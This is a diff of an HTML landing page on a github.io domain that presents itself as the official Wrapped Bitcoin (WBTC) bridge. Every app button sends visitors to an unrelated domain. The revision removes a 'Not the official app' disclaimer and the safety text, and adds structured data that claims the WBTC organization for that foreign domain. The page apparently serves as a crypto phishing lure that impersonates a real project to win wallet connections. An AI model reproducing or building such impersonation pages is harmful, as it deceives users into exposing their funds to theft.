@@ -1,47 +1,90 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>WBTC Bridge - Open App</title><meta name="description" content="wbtc bridge to the official Wrapped Bitcoin destination; verify WBTC on Ethereum, review bridge risks, and open app from the correct domain.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://wbtc-bridge.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="WBTC Bridge - Open App"><meta property="og:description" content="wbtc bridge to the official Wrapped Bitcoin destination; verify WBTC on Ethereum, review bridge risks, and open app from the correct domain.">
-<meta property="og:url" content="https://wbtc-bridge.github.io/"><meta property="og:image" content="https://wbtc-bridge.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="WBTC Bridge - Open App"><meta name="twitter:description" content="wbtc bridge to the official Wrapped Bitcoin destination; verify WBTC on Ethereum, review bridge risks, and open app from the correct domain."><meta name="twitter:image" content="https://wbtc-bridge.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://wbtc-bridge.github.io/#website", "url": "https://wbtc-bridge.github.io/", "name": "WBTC"}, {"@type": "WebPage", "@id": "https://wbtc-bridge.github.io/#webpage", "url": "https://wbtc-bridge.github.io/", "name": "WBTC Bridge - Open App", "description": "wbtc bridge to the official Wrapped Bitcoin destination; verify WBTC on Ethereum, review bridge risks, and open app from the correct domain.", "inLanguage": "en", "isPartOf": {"@id": "https://wbtc-bridge.github.io/#website"}}, {"@type": "Organization", "@id": "https://wbtc-bridge.github.io/#org", "name": "WBTC", "url": "https://wbtc-bridge.github.io/", "logo": "https://wbtc-bridge.github.io/og-cover.png", "sameAs": ["https://www.wbtc.network/", "https://x.com/WrappedBTC", "https://github.com/WrappedBTC/bitcoin-token-smart-contracts", "https://www.coingecko.com/en/coins/wrapped-bitcoin"]}, {"@type": "WebApplication", "@id": "https://wbtc-bridge.github.io/#app", "name": "WBTC Bridge", "url": "https://wbtc-bridge.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "wbtc bridge to the official Wrapped Bitcoin destination; verify WBTC on Ethereum, review bridge risks, and open app from the correct domain.", "featureList": ["ERC-20 on Ethereum", "BTC-backed model", "Verified contract"], "isPartOf": {"@id": "https://wbtc-bridge.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://wbtc-bridge.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "Is WBTC the same as Bitcoin?", "acceptedAnswer": {"@type": "Answer", "text": "No. WBTC is a tokenized representation of BTC used on Ethereum and other smart-contract networks. It is designed to track Bitcoin one-to-one, but it is not native BTC on the Bitcoin network. Users hold an ERC-20 token and accept the custody, token contract, and bridge assumptions behind that representation."}}, {"@type": "Question", "name": "Can I bridge native BTC directly into WBTC?", "acceptedAnswer": {"@type": "Answer", "text": "Some services support BTC-to-WBTC flows, but many retail users obtain WBTC by withdrawing from an exchange or swapping on a supported chain. Direct minting and redemption can involve specific merchants or custodial processes. For ordinary users, the practical path is usually to buy or swap WBTC, then bridge that WBTC only through routes that support the exact destination token."}}, {"@type": "Question", "name": "What is the WBTC contract address on Ethereum?", "acceptedAnswer": {"@type": "Answer", "text": "The WBTC token contract on Ethereum is 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599. Always verify the address on Etherscan or another trusted source before depositing or trading. Other chains may have different WBTC addresses, and some BTC-like tokens are not WBTC even if they use a similar icon or name."}}, {"@type": "Question", "name": "Why did I receive a different Bitcoin token after bridging?", "acceptedAnswer": {"@type": "Answer", "text": "Some bridge routes use available liquidity rather than preserving the exact asset. A route may output bridged WBTC, BTCB, tBTC, cbBTC, or another BTC representation if that is how the bridge or destination chain is configured. Before signing, inspect the receive token contract and make sure the destination protocol supports it."}}, {"@type": "Question", "name": "Is WBTC bridge slippage important?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, especially for large transfers. If the route includes a swap between WBTC and another BTC-like asset, slippage and price impact can reduce the destination amount. Even small percentages matter because WBTC represents high-value BTC exposure. Compare direct routes, minimum received, liquidity depth, and any intermediate swap legs before approving the bridge transaction."}}, {"@type": "Question", "name": "Should I bridge WBTC or swap to BTC first?", "acceptedAnswer": {"@type": "Answer", "text": "It depends on the destination. If you need BTC on the Bitcoin network, bridging WBTC may not be the right action; you may need an exchange or redemption path. If you need Bitcoin exposure inside Ethereum DeFi or an EVM chain, WBTC may be appropriate. The destination protocol's supported asset list should decide the route, not only the token name."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="WBTC"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">WBTC</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>WBTC Bridge</h1>
-      <div class="bridge-widget" role="group" aria-label="WBTC preview"><div class="bw-field"><span class="bw-coin"><img src="static/btc.png" alt="BTC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>BTC</b> · Bitcoin</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/wbtc.png" alt="WBTC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>WBTC</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-base.png" alt="Base" loading="lazy"><img src="static/net-optimism.png" alt="Optimism" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-avalanche.png" alt="Avalanche" loading="lazy"><img src="static/net-bnb.png" alt="BNB Chain" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WBTC ↗</a></div>
-      <p class="hero-note">Live preview — open the official WBTC app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">ERC-20 on Ethereum</span><span class="trust-chip">BTC-backed model</span><span class="trust-chip">Verified contract</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is WBTC Bridge?</h2><div class="capsule"><strong>WBTC</strong> Network is the official Wrapped Bitcoin destination for an <a class="inline-link" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">ERC-20 tokenized BTC asset</a> on Ethereum; verify the canonical contract on <a href="https://etherscan.io/token/0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599">Etherscan</a> before connecting a wallet.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>WBTC Bridge at a glance</h2><div class="facts"><div class="f"><small>Category</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/wrapped-bitcoin" rel="noopener noreferrer">Wrapped Bitcoin bridge asset</a></b></div><div class="f"><small>Network</small><b>Ethereum and EVM ecosystems</b></div><div class="f"><small>Token</small><b>WBTC</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.bitstamp.net/learn/cryptocurrency-guide/what-is-wrapped-bitcoin-wbtc/" rel="noopener noreferrer">Bitcoin-backed wrapped token</a></b></div><div class="f"><small>Peg</small><b>Designed to represent BTC 1:1</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>WBTC Bridge from Bitcoin to Ethereum</h2><div class="intent-a">WBTC is an <a class="inline-link" href="https://www.coingecko.com/learn/what-is-wrapped-bitcoin-wbtc-and-how-does-it-work" rel="noopener noreferrer">ERC-20 representation of Bitcoin</a> used in Ethereum DeFi. Moving from BTC to WBTC is not the same as a simple chain bridge between two EVM networks; it involves a <a class="inline-link" href="https://www.bitcoin.com/get-started/bitcoin/technical/what-is-wbtc/" rel="noopener noreferrer">wrapped Bitcoin system</a> where BTC backs minted WBTC. Retail users often acquire WBTC through exchanges or swaps rather than minting directly. Once on Ethereum, WBTC can be used in lending, liquidity pools, collateral systems, and DEX trades. The Ethereum WBTC token contract is 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, and users should verify it before bridging or depositing.</div></div></section><section class="section"><div class="container"><h2>WBTC Bridge to Arbitrum, Base, Polygon, or Optimism</h2><div class="intent-a">WBTC can move across <a class="inline-link" href="https://ethereum.org/en/developers/docs/evm/" rel="noopener noreferrer">EVM networks</a> through bridge routes, but the destination token may be canonical WBTC, bridged WBTC, or another wrapped BTC representation depending on the chain and route. This matters because lending markets and exchanges may support one version but not another. Before bridging WBTC, check the source chain, destination chain, token contract, liquidity, and whether the receiving platform accepts that exact WBTC. A <a class="inline-link" href="https://defillama.com/bridges" rel="noopener noreferrer">bridge aggregator</a> can quote routes, but high-value transfers should also be compared with official bridge or exchange withdrawal paths.</div></div></section><section class="section section-alt"><div class="container"><h2>WBTC Bridge fees, slippage, and <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8200595602084-What-does-Minimum-Received-mean-in-a-swap" rel="noopener noreferrer">minimum received</a></h2><div class="intent-a">WBTC bridge cost can include source gas, destination gas, bridge fees, solver fees, and <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener noreferrer">DEX slippage</a> if the route swaps between BTC-like assets. Because WBTC is high-value per token, even a small percentage slippage can be expensive on large transfers. The most useful quote field is minimum received on the destination chain, not only the displayed bridge fee. Review whether the route sends WBTC directly or swaps through WETH, USDC, tBTC, cbBTC, or another BTC wrapper.</div></div></section><section class="section"><div class="container"><h2>WBTC Bridge safety and <a class="inline-link" href="https://wbtc.network/dashboard/audit" rel="noopener noreferrer">proof of reserves</a></h2><div class="intent-a">WBTC bridge safety has two parts: the wrapped Bitcoin backing model and the <a class="inline-link" href="https://eco.com/support/en/articles/11751627-bridging-wrapped-tokens-wbtc-weth-wsteth" rel="noopener noreferrer">cross-chain route</a> used to move the token. WBTC itself represents BTC-backed ERC-20 exposure, while a bridge route may add smart-contract, validator, message-passing, or liquidity risk. Verify the token contract, check the official WBTC site and block explorer, review the route's bridge protocol, and send a test amount for new chains. Do not rely on the WBTC symbol alone because fake or unsupported BTC wrappers can appear in wallets and DEX pools.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge WBTC Bridge</h2><ol class="steps"><li><b>Verify the destination</b><span>Open the official WBTC domain and compare the token contract before using any wallet prompt or third-party route.</span></li><li><b>Choose the route</b><span>For BTC to WBTC or redemption, follow the current supported merchant, exchange, or app path shown from the official destination.</span></li><li><b>Review assumptions</b><span>Confirm network, recipient address, <a class="inline-link" href="https://www.wbtc.network/assets/wrapped-tokens-whitepaper.pdf" rel="noopener noreferrer">custody model</a>, confirmations, and any provider fees before submitting a transaction.</span></li><li><b>Track settlement</b><span>Use Bitcoin and Ethereum explorers to confirm the BTC leg, WBTC mint, burn, or <a class="inline-link" href="https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" rel="noopener noreferrer">ERC-20 transfer status</a>.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official WBTC app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WBTC ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>WBTC vs other wrapped Bitcoin assets</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>WBTC</th><th>Alternative BTC wrapper</th></tr></thead><tbody><tr><td>Primary use</td><td>Ethereum DeFi collateral and liquidity</td><td>Chain-specific BTC exposure</td></tr><tr><td>Token standard</td><td>ERC-20 on Ethereum and bridged versions</td><td>Varies by issuer and chain</td></tr><tr><td>Acceptance</td><td>Broadly integrated in major <a class="inline-link" href="https://defillama.com/protocols" rel="noopener noreferrer">DeFi markets</a></td><td>Depends on protocol support</td></tr><tr><td>Main check</td><td>Official contract and <a class="inline-link" href="https://www.bitstamp.net/learn/cryptocurrency-guide/what-is-wrapped-bitcoin-wbtc/" rel="noopener noreferrer">backing model</a></td><td>Issuer, liquidity, redemption, bridge route</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>WBTC Bridge FAQ</h2><div class="faq-list"><details open><summary><h3>Is WBTC the same as Bitcoin?</h3></summary><div>No. WBTC is a <a class="inline-link" href="https://academy.binance.com/en/articles/what-are-wrapped-tokens" rel="noopener noreferrer">tokenized representation of BTC</a> used on Ethereum and other smart-contract networks. It is designed to track Bitcoin one-to-one, but it is not <a class="inline-link" href="https://www.bitcoin.com/get-started/bitcoin/technical/what-is-wbtc/" rel="noopener noreferrer">native BTC on the Bitcoin network</a>. Users hold an ERC-20 token and accept the custody, token contract, and bridge assumptions behind that representation.</div></details><details><summary><h3>Can I bridge native BTC directly into WBTC?</h3></summary><div>Some services support BTC-to-WBTC flows, but many retail users obtain WBTC by withdrawing from an exchange or swapping on a supported chain. Direct minting and redemption can involve specific merchants or custodial processes. For ordinary users, the practical path is usually to buy or swap WBTC, then bridge that WBTC only through routes that support the exact destination token.</div></details><details><summary><h3>What is the WBTC contract address on Ethereum?</h3></summary><div>The WBTC token contract on Ethereum is 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599. Always verify the address on Etherscan or another trusted source before depositing or trading. Other chains may have different WBTC addresses, and some BTC-like tokens are not WBTC even if they use a similar icon or name.</div></details><details><summary><h3>Why did I receive a different Bitcoin token after bridging?</h3></summary><div>Some bridge routes use available liquidity rather than preserving the exact asset. A route may output bridged WBTC, BTCB, tBTC, cbBTC, or another BTC representation if that is how the bridge or destination chain is configured. Before signing, inspect the receive token contract and make sure the destination protocol supports it.</div></details><details><summary><h3>Is WBTC bridge slippage important?</h3></summary><div>Yes, especially for large transfers. If the route includes a swap between WBTC and another BTC-like asset, slippage and price impact can reduce the destination amount. Even small percentages matter because WBTC represents high-value BTC exposure. Compare direct routes, minimum received, liquidity depth, and any intermediate swap legs before approving the bridge transaction.</div></details><details><summary><h3>Should I bridge WBTC or swap to BTC first?</h3></summary><div>It depends on the destination. If you need BTC on the Bitcoin network, bridging WBTC may not be the right action; you may need an exchange or redemption path. If you need Bitcoin exposure inside Ethereum DeFi or an EVM chain, WBTC may be appropriate. The destination protocol's supported asset list should decide the route, not only the token name.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify the domain before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>WBTC Bridge</title>
+  <meta name="description" content="WBTC Bridge moves Wrapped Bitcoin between Ethereum and other networks through a fast, low-fee route.">
+  <link rel="canonical" href="https://wbtc-bridge.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F4F6FB">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="WBTC Bridge">
+  <meta property="og:description" content="WBTC Bridge moves Wrapped Bitcoin between Ethereum and other networks through a fast, low-fee route.">
+  <meta property="og:url" content="https://wbtc-bridge.github.io/">
+  <meta property="og:image" content="https://wbtc-bridge.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="WBTC Bridge">
+  <meta name="twitter:description" content="Move Wrapped Bitcoin between Ethereum and other networks in one clean flow.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> WBTC Bridge</a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
+      <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="sp"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <h1>WBTC Bridge</h1>
+    <p class="sub"><strong>WBTC Bridge</strong> moves Wrapped Bitcoin between Ethereum and other networks through a fast, low-fee route.</p>
+
+    <section class="card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="lbl">From</span>
+          <span class="chip">
+            <img class="ic" src="wbtc.png" width="26" height="26" alt="WBTC">
+            <span class="t">WBTC</span>
+          </span>
+        </div>
+        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
+        <div class="leg">
+          <span class="lbl">To</span>
+          <span class="chip">
+            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
+            <span class="t">ETH</span>
+          </span>
+        </div>
+      </div>
+      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+      <p class="note">Preview only &mdash; rates, routes and fees are shown in the app.</p>
+    </section>
+  </main>
+
+  <footer class="foot">
+    <b>WBTC Bridge</b> &mdash; 2026
+  </footer>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "WBTC Bridge", "inLanguage": "en" },
+      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Wrapped Bitcoin", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://wbtc.network/","https://x.com/WrappedBTC"] },
+      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "WBTC Bridge", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
+    ]
+  }
+  </script>
+
+  <script>
+  (function(){
+    "use strict";
+    var root=document, btn=root.querySelector('[data-dir]');
+    if(!btn) return;
+    btn.addEventListener('click', function(){
+      var chips=root.querySelectorAll('.leg .chip');
+      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
+    });
+  })();
+  </script>
+</body>
+</html>
